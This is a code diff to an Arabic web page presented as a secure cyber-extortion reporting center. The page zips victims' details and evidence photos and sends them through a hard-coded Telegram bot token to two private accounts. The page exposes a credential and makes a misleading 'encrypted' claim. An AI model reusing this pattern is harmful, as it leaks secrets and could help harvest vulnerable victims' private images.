@@ -12,7 +12,7 @@
 *{box-sizing:border-box;margin:0;padding:0;font-family:'Plus Jakarta Sans',sans-serif}
 html,body{width:100%;overflow-x:hidden}
 body{background:var(--bg);color:var(--txt);min-height:100vh;padding:20px 15px;display:block}
-.wrap{width:100%;max-width:680px;margin:0 auto}
+.wrap{width:100%;max-width:680px;margin:0}
 .bar{display:flex;justify-content:space-between;align-items:center;background:var(--surf);border:1px solid var(--bd);padding:12px 18px;border-radius:12px;margin-bottom:20px;font-size:.78rem;color:var(--mut);flex-wrap:wrap;gap:10px}
 .live{display:flex;align-items:center;gap:8px;color:var(--ok);font-weight:600}
 .dot{width:8px;height:8px;background:var(--ok);border-radius:50%;animation:p 2s infinite}
@@ -83,7 +83,7 @@ select.fi{cursor:pointer}
 <div id="formScreen" class="scr on">
 <div class="hdr">
 <h1>مركز بلاغات <span>الابتزاز</span></h1>
-<p>منصة آمنة لاستقبال بلاغات الابتزاز الإلكتروني</p>
+<p></p>منصة آمنة لاستقبال بلاغات الابتزاز الإلكتروني</p>
 <div class="sbadge">🔒 اتصال مشفر</div>
 </div>
 <div class="warn">
@@ -154,17 +154,16 @@ select.fi{cursor:pointer}
 <a href="https://t.me/kilj_999" target="_blank" class="lchip">المالك: @kilj_999</a>
 <a href="https://t.me/kilj99" target="_blank" class="lchip">القناة: @kilj99</a>
 </div>
-<div class="sig">DEVELOPED BY TERMUX KILJ © 2026 — v6.1</div>
+<div class="sig">DEVELOPED BY TERMUX KILJ © 2026 — v6.2</div>
 </div>
 </div>
 
 <script>
 var TOKEN = '8348708139:AAHIx6l27UjbLTjPTRJbGflUaUysMUv7_UM';
 
-// ============ المشرفون (يصلهم البلاغ) ============
 var ADMINS = [
-    '6896358657',  // المالك
-    '7176775023'   // المشرف
+    '6896358657',
+    '7176775023'
 ];
 
 var currentScreen = 'form';
@@ -174,7 +173,6 @@ var RATE = 60000;
 var MAXF = 20;
 var MAXS = 10 * 1024 * 1024;
 
-// ============ الوضع الليلي ============
 function toggleTheme() {
     var cur = document.documentElement.getAttribute('data-theme');
     var nx = cur === 'light' ? 'dark' : 'light';
@@ -188,7 +186,6 @@ document.addEventListener('DOMContentLoaded', function() {
     document.getElementById('thBtn').textContent = st === 'light' ? '☀️' : '🌙';
 });
 
-// ============ التبديل ============
 function switchScreen() {
     var f = document.getElementById('formScreen');
     var t = document.getElementById('termsScreen');
@@ -213,7 +210,6 @@ function updateCounter(ta) {
     document.getElementById('cc').textContent = ta.value.length + ' / 3000 حرف';
 }
 
-// ============ الملفات ============
 var dz = document.getElementById('dz');
 var fi = document.getElementById('fileInput');
 var grid = document.getElementById('grid');
@@ -307,7 +303,6 @@ function setProgress(p) {
     }
 }
 
-// ============ إرسال لكل المشرفين ============
 function sendToAllAdmins(text) {
     var promises = ADMINS.map(function(adminId) {
         return fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage', {
@@ -368,9 +363,8 @@ function sendPhotosToAllAdmins(btn, rid) {
     });
 }
 
-// ============ بناء النص ============
 function buildText(tg, ig, typeName, dt, rid, count, zipSize) {
-    var txt = '🚨 بلاغ ابتزاز جديد - KILJ v6.1\n\n';
+    var txt = '🚨 بلاغ ابتزاز جديد - KILJ v6.2\n\n';
     txt += '🆔 رقم البلاغ: #' + rid + '\n';
     txt += '📅 التاريخ: ' + new Date().toLocaleString('ar-EG') + '\n\n';
     txt += '💬 تيليجرام: ' + (tg || 'غير متوفر') + '\n';
@@ -382,7 +376,6 @@ function buildText(tg, ig, typeName, dt, rid, count, zipSize) {
     return txt;
 }
 
-// ============ الدالة الرئيسية ============
 function sendReport() {
     var btn = document.getElementById('sendBtn');
 
@@ -425,7 +418,6 @@ function sendReport() {
 
     var rid = Date.now().toString().slice(-8);
 
-    // بدون صور
     if (uploadedFiles.length === 0) {
         var txtOnly = buildText(tg, ig, typeNames[bt], dt, rid, 0);
         sendToAllAdmins(txtOnly)
@@ -442,7 +434,6 @@ function sendReport() {
         return;
     }
 
-    // ==== إنشاء ZIP ====
     setProgress(15);
     var zip = new JSZip();
     var folder = zip.folder('صور_الأدلة');
@@ -462,14 +453,12 @@ function sendReport() {
         var zipName = 'صور_الأدلة_' + rid + '.zip';
         var caption = '📦 صور الأدلة - بلاغ #' + rid + ' (' + uploadedFiles.length + ' صورة)';
 
-        // 1. إرسال النص للجميع
         return sendToAllAdmins(txt)
         .then(function(results) {
             var anyOk = results.some(function(r) { return r.ok; });
             if (!anyOk) throw new Error('فشل إرسال النص');
             setProgress(70);
 
-            // 2. إرسال ZIP للجميع
             return sendDocToAllAdmins(zipBlob, zipName, caption);
         })
         .then(function(docResults) {
@@ -480,8 +469,6 @@ function sendReport() {
             if (anyZipOk) {
                 finishSend(btn, rid, true);
             } else {
-                // بديل: إرسال الصور منفردة
-                console.log('ZIP فشل، إرسال الصور منفردة...');
                 sendPhotosToAllAdmins(btn, rid);
             }
         });
